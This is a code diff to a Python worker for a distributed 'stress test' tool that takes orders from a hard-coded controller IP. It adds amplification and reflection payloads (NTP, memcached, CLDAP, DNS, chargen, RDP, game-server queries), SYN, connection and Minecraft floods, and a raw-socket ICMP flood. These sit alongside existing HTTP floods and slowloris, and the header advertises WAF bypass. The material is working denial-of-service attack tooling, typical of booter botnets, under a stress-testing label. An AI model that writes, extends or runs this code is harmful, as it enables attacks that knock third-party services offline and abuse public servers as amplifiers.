@@ -1,8 +1,9 @@
 #!/usr/bin/env python3
 """
-AegisShield Stress Test Worker v2.0 (HIGH PERFORMANCE)
+AegisShield Stress Test Worker v4.0 (ULTIMATE)
 =======================================================
 Optimized for 2Gbps+ links. Uses multiprocessing + threading for max throughput.
+Supports full range of L4 and L7 amplification payloads, WAF bypass, HTTP attacks.
 Usage:
     python3 worker.py --master 52.53.124.44:7777
 """
@@ -18,6 +19,25 @@ import argparse
 import http.client
 import sys
 import os
+import struct
+
+# ══════════════════════════════════════════════════════════════════
+#  Specific Attack Protocol Payloads (Amplifications / Games)
+# ══════════════════════════════════════════════════════════════════
+UDP_PAYLOADS = {
+    "vse": b'\xff\xff\xff\xffTSource Engine Query\x00',
+    "ts3": b'\x05\xca\x7f\x16\x9c\x11\xe9\x89\x00\x00\x00\x00\x02',
+    "fivem": b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00',
+    "fivem-token": b'\xff\xff\xff\xffgetstatus\x00',
+    "mem": b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n',
+    "ntp": b'\x17\x00\x03\x2a' + b'\x00'*44,
+    "mcpe": b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
+    "dns": b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x69\x73\x00\x00\xff\x00\x01\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00',
+    "char": b'\x01',
+    "cldap": b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
+    "ard": b'\x00\x14\x00\x00\x00\x00\x00\x00',
+    "rdp": b'\x03\x00\x00\x0b\x06\xe0\x00\x00\x00\x00\x00'
+}
 
 
 class StressWorker:
@@ -83,23 +103,28 @@ class StressWorker:
     def run_attack(self, target, port, method, size, duration, power):
         # Scale processes down if power is low
         max_cpus = os.cpu_count() or 4
-        # At 1% power, we run 1 process. At 100% we run all.
         cpu_count = max(1, int(max_cpus * (power / 100.0)))
         
-        # We also pass the "power" percentage so the loops can sleep to throttle it further
         delay = 0.0
         if power < 100:
-            # 1% power = ~0.01 sec delay between rapid ops. 99% power = ~0.0001 sec.
             delay = (100 - power) / 10000.0
 
         size_disp = "RANDOM" if size == -1 else f"{size}B"
+        if method in UDP_PAYLOADS:
+            size_disp = f"Fixed ({len(UDP_PAYLOADS[method])}B)"
+            
         print(f"  🔥 {method.upper()} → {target}:{port} | {size_disp} | {duration}s | Pwr: {power}%")
         print(f"     Procs: {cpu_count} (Max {max_cpus}) | Throttle delay: {delay:.5f}s")
 
-        if method == "udp":
-            self._attack_udp_mp(target, port, size, duration, cpu_count, delay)
-        elif method == "tcp":
-            self._attack_tcp_mp(target, port, size, duration, cpu_count, delay)
+        udp_methods = ("udp", "ovh", "vse", "ts3", "fivem", "fivem-token", "mem", "ntp", "mcpe", "dns", "char", "cldap", "ard", "rdp")
+        tcp_methods = ("tcp", "syn", "cps", "connection", "mcbot", "minecraft")
+
+        if method in udp_methods:
+            self._attack_udp_mp(target, port, method, size, duration, cpu_count, delay)
+        elif method in tcp_methods:
+            self._attack_tcp_mp(target, port, method, size, duration, cpu_count, delay)
+        elif method == "icmp":
+            self._attack_icmp(target, port, duration, cpu_count, delay)
         elif method == "http":
             self._attack_http(target, port, duration, use_ssl=False, power=power)
         elif method == "https":
@@ -110,51 +135,27 @@ class StressWorker:
     # ──────────────────────────────────────────────────────────────
     #  UDP FLOOD — Multiprocess + Multithread for max bandwidth
     # ──────────────────────────────────────────────────────────────
-    def _attack_udp_mp(self, target, port, size, duration, num_procs, delay):
-        counter = multiprocessing.Value('q', 0)  # shared int64 counter
+    def _attack_udp_mp(self, target, port, method, size, duration, num_procs, delay):
+        counter = multiprocessing.Value('q', 0)
         stop = multiprocessing.Event()
         procs = []
 
         for _ in range(num_procs):
             p = multiprocessing.Process(
                 target=_udp_process,
-                args=(target, port, size, duration, counter, stop, delay),
+                args=(target, port, method, size, duration, counter, stop, delay),
                 daemon=True
             )
             p.start()
             procs.append(p)
 
-        start = time.time()
-        try:
-            while time.time() - start < duration and not self.stop_flag.is_set():
-                time.sleep(2)
-                elapsed = max(time.time() - start, 0.1)
-                sent = counter.value
-                pps = sent / elapsed
-                avg_size = 32768 if size == -1 else max(size, 1)
-                mbps = sent * avg_size * 8 / elapsed / 1_000_000
-                self.send_msg({"type": "stats", "sent": sent,
-                               "pps": round(pps), "mbps": round(mbps, 1),
-                               "method": "UDP"})
-                print(f"  📊 UDP | {sent:,} pkts | {pps:,.0f} pps | {mbps:,.1f} Mbps")
-        except KeyboardInterrupt:
-            pass
-
-        stop.set()
-        for p in procs:
-            p.join(timeout=3)
-            if p.is_alive():
-                p.terminate()
-
-        total = counter.value
-        elapsed = max(time.time() - start, 0.1)
-        self.send_msg({"type": "done", "total": total, "duration": elapsed})
-        print(f"  ✅ UDP done. {total:,} pkts in {elapsed:.1f}s")
+        self._monitor_progress(start_time=time.time(), duration=duration, counter=counter, 
+                               method=method.upper(), size=size, procs=procs, stop=stop)
 
     # ──────────────────────────────────────────────────────────────
     #  TCP FLOOD — Multiprocess connection storm
     # ──────────────────────────────────────────────────────────────
-    def _attack_tcp_mp(self, target, port, size, duration, num_procs, delay):
+    def _attack_tcp_mp(self, target, port, method, size, duration, num_procs, delay):
         counter = multiprocessing.Value('q', 0)
         stop = multiprocessing.Event()
         procs = []
@@ -162,27 +163,54 @@ class StressWorker:
         for _ in range(num_procs):
             p = multiprocessing.Process(
                 target=_tcp_process,
-                args=(target, port, size, duration, counter, stop, delay),
+                args=(target, port, method, size, duration, counter, stop, delay),
                 daemon=True
             )
             p.start()
             procs.append(p)
 
-        start = time.time()
+        self._monitor_progress(start_time=time.time(), duration=duration, counter=counter, 
+                               method=method.upper(), size=size, procs=procs, stop=stop)
+
+    # ──────────────────────────────────────────────────────────────
+    #  ICMP FLOOD — Raw sockets ping
+    # ──────────────────────────────────────────────────────────────
+    def _attack_icmp(self, target, port, duration, num_procs, delay):
+        counter = multiprocessing.Value('q', 0)
+        stop = multiprocessing.Event()
+        procs = []
+
+        for _ in range(num_procs):
+            p = multiprocessing.Process(
+                target=_icmp_process,
+                args=(target, duration, counter, stop, delay),
+                daemon=True
+            )
+            p.start()
+            procs.append(p)
+
+        self._monitor_progress(start_time=time.time(), duration=duration, counter=counter, 
+                               method="ICMP", size=64, procs=procs, stop=stop)
+
+    def _monitor_progress(self, start_time, duration, counter, method, size, procs, stop):
         try:
-            while time.time() - start < duration and not self.stop_flag.is_set():
+            while time.time() - start_time < duration and not self.stop_flag.is_set():
                 time.sleep(2)
-                elapsed = max(time.time() - start, 0.1)
+                elapsed = max(time.time() - start_time, 0.1)
                 sent = counter.value
-                cps = sent / elapsed
-                
+                pps = sent / elapsed
                 avg_size = 32768 if size == -1 else max(size, 1)
-                mbps = sent * avg_size * 8 / elapsed / 1_000_000
                 
+                # Assume 64 byte avg for empty payloads like SYN
+                if size == 0: avg_size = 64
+                if method.lower() in UDP_PAYLOADS: 
+                    avg_size = len(UDP_PAYLOADS[method.lower()])
+                    
+                mbps = sent * avg_size * 8 / elapsed / 1_000_000
                 self.send_msg({"type": "stats", "sent": sent,
-                               "pps": round(cps), "mbps": round(mbps, 1),
-                               "method": "TCP"})
-                print(f"  📊 TCP | {sent:,} conns | {cps:,.0f} conn/s | {mbps:,.1f} Mbps")
+                               "pps": round(pps), "mbps": round(mbps, 1),
+                               "method": method})
+                print(f"  📊 {method} | {sent:,} pkts | {pps:,.0f} pps | {mbps:,.1f} Mbps")
         except KeyboardInterrupt:
             pass
 
@@ -193,9 +221,9 @@ class StressWorker:
                 p.terminate()
 
         total = counter.value
-        elapsed = max(time.time() - start, 0.1)
+        elapsed = max(time.time() - start_time, 0.1)
         self.send_msg({"type": "done", "total": total, "duration": elapsed})
-        print(f"  ✅ TCP done. {total:,} conns in {elapsed:.1f}s")
+        print(f"  ✅ {method} done. {total:,} pkts in {elapsed:.1f}s")
 
     # ──────────────────────────────────────────────────────────────
     #  HTTP/HTTPS FLOOD
@@ -203,7 +231,7 @@ class StressWorker:
     def _attack_http(self, target, port, duration, use_ssl=False, power=100):
         sent = [0]
         end_time = time.time() + duration
-        threads = max(1, int(64 * (power / 100.0)))  # throttle threads by power
+        threads = max(1, int(64 * (power / 100.0)))
         proto = "HTTPS" if use_ssl else "HTTP"
         delay = (100 - power) / 1000.0
 
@@ -252,7 +280,7 @@ class StressWorker:
         print(f"  ✅ {proto} done. {sent[0]:,} reqs in {elapsed:.1f}s")
 
     # ──────────────────────────────────────────────────────────────
-    #  SLOWLORIS (Ties up proxy connections)
+    #  SLOWLORIS
     # ──────────────────────────────────────────────────────────────
     def _attack_slowloris(self, target, port, duration, power):
         end_time = time.time() + duration
@@ -290,7 +318,6 @@ class StressWorker:
         while time.time() < end_time and not self.stop_flag.is_set():
             time.sleep(10)
             
-            # Keep alive all sockets by sending a fake header periodically
             dead = []
             for i, s in enumerate(sockets):
                 try:
@@ -298,11 +325,9 @@ class StressWorker:
                 except OSError:
                     dead.append(i)
             
-            # Remove dead sockets backwards
             for i in reversed(dead):
                 sockets.pop(i)
                 
-            # Bring sockets back up to desired count
             for _ in range(socket_count - len(sockets)):
                 if self.stop_flag.is_set():
                     break
@@ -321,8 +346,7 @@ class StressWorker:
             try:
                 s.send("Connection: close\r\n\r\n".encode("utf-8"))
                 s.close()
-            except OSError:
-                pass
+            except OSError: pass
                 
         elapsed = max(time.time() - start, 0.1)
         self.send_msg({"type": "done", "total": sent[0], "duration": elapsed})
@@ -333,28 +357,31 @@ class StressWorker:
 #  Standalone process functions (run in separate processes)
 # ══════════════════════════════════════════════════════════════════
 
-def _udp_process(target, port, size_val, duration, counter, stop_event, delay):
-    """Each process runs 16 threads, each with its own socket."""
+def _udp_process(target, port, method, size_val, duration, counter, stop_event, delay):
     end_time = time.time() + duration
-    BATCH = 50  # update shared counter every N packets
+    BATCH = 50
 
     def sender():
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        # Max send buffer for throughput
-        try:
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
-        except Exception:
-            pass
-        c = 0
+        try: s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
+        except Exception: pass
         
-        # Pre-allocate random payload if fixed size
-        if size_val > 0:
-            payload = random.randbytes(size_val)
+        c = 0
+        static_payload = None
+        if method in UDP_PAYLOADS:
+            static_payload = UDP_PAYLOADS[method]
+        elif size_val > 0 and method != "ovh":
+            static_payload = random.randbytes(size_val)
             
         while time.time() < end_time and not stop_event.is_set():
             try:
-                if size_val == -1:
+                if static_payload:
+                    payload = static_payload
+                elif method == "ovh":
+                    payload = b"GET / HTTP/1.1\r\nHost: " + random.randbytes(10) + b"\r\n\r\n" + random.randbytes(64)
+                else:
                     payload = random.randbytes(random.randint(64, 65507))
+                
                 s.sendto(payload, (target, port))
                 c += 1
                 if c % BATCH == 0:
@@ -364,7 +391,7 @@ def _udp_process(target, port, size_val, duration, counter, stop_event, delay):
                     time.sleep(delay)
             except OSError:
                 pass
-        # flush remainder
+                
         with counter.get_lock():
             counter.value += c % BATCH
         s.close()
@@ -378,29 +405,58 @@ def _udp_process(target, port, size_val, duration, counter, stop_event, delay):
         t.join()
 
 
-def _tcp_process(target, port, size_val, duration, counter, stop_event, delay):
-    """Each process runs 16 threads doing TCP connections."""
+def _tcp_process(target, port, method, size_val, duration, counter, stop_event, delay):
     end_time = time.time() + duration
     BATCH = 10
 
     def connector():
         c = 0
-        if size_val > 0:
-            payload = random.randbytes(size_val)
+        static_payload = None
+        if size_val > 0 and method not in ("syn", "cps", "connection"):
+            if method in ("mcbot", "minecraft"):
+                static_payload = b"\x0f\x00\x2f\x09localhost\xdd\x01\x01\x00"
+            else:
+                static_payload = random.randbytes(size_val)
             
         while time.time() < end_time and not stop_event.is_set():
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(2)
-                s.connect((target, port))
-                if size_val == -1:
-                    payload = random.randbytes(random.randint(64, 32768))
-                s.sendall(payload)
-                c += 1
+                
+                if method == "syn":
+                    # pure python SYN flood trick: fire connect() non-blocking and close
+                    s.setblocking(False)
+                    try:
+                        s.connect((target, port))
+                    except (BlockingIOError, InterruptedError):
+                        pass
+                    s.close()
+                    c += 1
+                else:
+                    s.settimeout(2)
+                    s.connect((target, port))
+                    
+                    if method == "cps":
+                        s.close() # just rapid opens and closes
+                    elif method == "connection":
+                        s.sendall(b"X")
+                        time.sleep(0.5) # holding it slightly open
+                        s.close()
+                    else:
+                        if static_payload:
+                            payload = static_payload
+                        elif size_val == -1:
+                            payload = random.randbytes(random.randint(64, 32768))
+                        else:
+                            payload = b""
+                            
+                        if payload:
+                            s.sendall(payload)
+                        s.close()
+                    c += 1
+                
                 if c % BATCH == 0:
                     with counter.get_lock():
                         counter.value += BATCH
-                s.close()
                 if delay > 0:
                     time.sleep(delay)
             except OSError:
@@ -408,6 +464,7 @@ def _tcp_process(target, port, size_val, duration, counter, stop_event, delay):
                 if c % BATCH == 0:
                     with counter.get_lock():
                         counter.value += BATCH
+                        
         with counter.get_lock():
             counter.value += c % BATCH
 
@@ -420,19 +477,80 @@ def _tcp_process(target, port, size_val, duration, counter, stop_event, delay):
         t.join()
 
 
+def _icmp_process(target, duration, counter, stop_event, delay):
+    end_time = time.time() + duration
+    BATCH = 10
+    
+    # Try opening raw socket (Requires Root/Admin)
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+    except OSError as e:
+        print(f"  [!] ICMP failed (requires root/admin rights): {e}")
+        return
+
+    def checksum(source_string):
+        s_sum = 0
+        countTo = (len(source_string) // 2) * 2
+        count = 0
+        while count < countTo:
+            thisVal = source_string[count + 1] * 256 + source_string[count]
+            s_sum = s_sum + thisVal
+            s_sum = s_sum & 0xffffffff 
+            count = count + 2
+        if countTo < len(source_string):
+            s_sum = s_sum + source_string[-1]
+            s_sum = s_sum & 0xffffffff 
+        s_sum = (s_sum >> 16) + (s_sum & 0xffff)
+        s_sum = s_sum + (s_sum >> 16)
+        answer = ~s_sum
+        answer = answer & 0xffff
+        answer = answer >> 8 | (answer << 8 & 0xff00)
+        return answer
+
+    header = struct.pack('bbHHh', 8, 0, 0, 1, 1)
+    data = b'Aegis ICMP Stress Test Packet ' * 2
+    my_checksum = checksum(header + data)
+    header = struct.pack('bbHHh', 8, 0, socket.htons(my_checksum), 1, 1)
+    packet = header + data
+
+    def pinger():
+        c = 0
+        while time.time() < end_time and not stop_event.is_set():
+            try:
+                s.sendto(packet, (target, 1))
+                c += 1
+                if c % BATCH == 0:
+                    with counter.get_lock():
+                        counter.value += BATCH
+                if delay > 0:
+                    time.sleep(delay)
+            except OSError:
+                pass
+        with counter.get_lock():
+            counter.value += c % BATCH
+
+    threads = []
+    for _ in range(4): # 4 threads per process for ICMP
+        t = threading.Thread(target=pinger, daemon=True)
+        t.start()
+        threads.append(t)
+    for t in threads:
+        t.join()
+
+
 BANNER = r"""
    __        __         _               ____  
    \ \      / /__  _ __| | _____ _ __  |___ \ 
     \ \ /\ / / _ \| '__| |/ / _ \ '__|   __) |
-     \ V  V / (_) | |  |   <  __/ |     / __/ 
+      V  V / (_) | |  |   <  __/ |     / __/ 
       \_/\_/ \___/|_|  |_|\_\___|_|    |_____|
 
-  AegisShield Stress Test Worker v3.0 (ADVANCED)
+  AegisShield Stress Test Worker v4.0 (ULTIMATE)
 """
 
 
 def main():
-    parser = argparse.ArgumentParser(description="Stress Test Worker v3")
+    parser = argparse.ArgumentParser(description="Stress Test Worker v4")
     parser.add_argument("--master", required=True,
                         help="Controller address (e.g. 52.53.124.44:7777)")
     args = parser.parse_args()
